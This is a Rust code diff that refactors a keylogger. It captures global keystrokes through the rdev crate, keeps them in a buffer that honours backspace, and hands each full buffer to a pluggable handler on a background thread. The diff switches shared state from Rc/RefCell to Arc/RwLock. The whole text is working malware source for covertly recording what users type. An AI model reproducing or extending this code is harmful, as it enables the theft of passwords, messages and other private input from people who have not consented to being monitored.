@@ -7,28 +7,31 @@ use rdev::{
     Key::Backspace,
 };
 
-use std::cell::RefCell;
+use std::sync::Arc;
+use std::sync::RwLock;
+
+//use std::cell::RefCell;
 use std::io::Result;
-use std::rc::Rc;
+//use std::rc::Rc;
 use std::thread;
 
 pub struct Keylogger {
-    method: Rc<RefCell<Method>>,
-    buffer: Rc<RefCell<Vec<String>>>,
-    buffer_capacity: Rc<RefCell<usize>>,
+    method: Arc<RwLock<Method>>,
+    buffer: Arc<RwLock<Vec<String>>>,
+    buffer_capacity: Arc<RwLock<usize>>,
 }
 
 impl Keylogger {
     pub fn new(method: Method) -> Self {
         Self {
-            method: Rc::new(RefCell::new(method)),
-            buffer: Rc::new(RefCell::new(Vec::new())),
-            buffer_capacity: Rc::new(RefCell::new(1000)),
+            method: Arc::new(RwLock::new(method)),
+            buffer: Arc::new(RwLock::new(Vec::new())),
+            buffer_capacity: Arc::new(RwLock::new(1000)),
         }
     }
 
     pub fn set_buffer_capacity(self, new_cap: usize) -> Self {
-        *self.buffer_capacity.borrow_mut() = new_cap;
+        *self.buffer_capacity.write().unwrap() = new_cap;
         self
     }
 
@@ -37,18 +40,25 @@ impl Keylogger {
         let method = self.method.clone();
         let buffer_cap = self.buffer_capacity.clone();
         let _ = listen(move |event: Event| {
+            let mut buffer = buffer.write().unwrap();
             if let KeyPress(Backspace) = event.event_type {
-                if buffer.borrow().is_empty() {
+                if buffer.is_empty() {
                     return;
                 }
-                buffer.borrow_mut().pop();
+                buffer.pop();
             }
             if let Some(name) = event.name {
-                let mut buffer = buffer.borrow_mut();
-                if buffer.len() == *buffer_cap.borrow() {
-                    println!("{} / {}", buffer.len(), *buffer_cap.borrow());
+                //let mut buffer: Vec<String> = buffer.to_vec();
+                let buffer_cap: usize = { *buffer_cap.read().unwrap() };
+                println!("{} / {}", buffer.len(), buffer_cap);
+                if buffer.len() == buffer_cap {
                     buffer.push(name);
-                    method.borrow_mut().handle(&buffer).expect("Failed to handle buffer");
+                    // spawns a daemon thread to avoid lag when handling the buffer
+                    let buffer_clone = buffer.clone();
+                    let method_clone = method.clone();
+                    let _ = thread::spawn(move || {
+                        method_clone.write().unwrap().handle(&buffer_clone).expect("Failed to handle buffer");
+                    });
                     buffer.clear();
                     return;
                 }
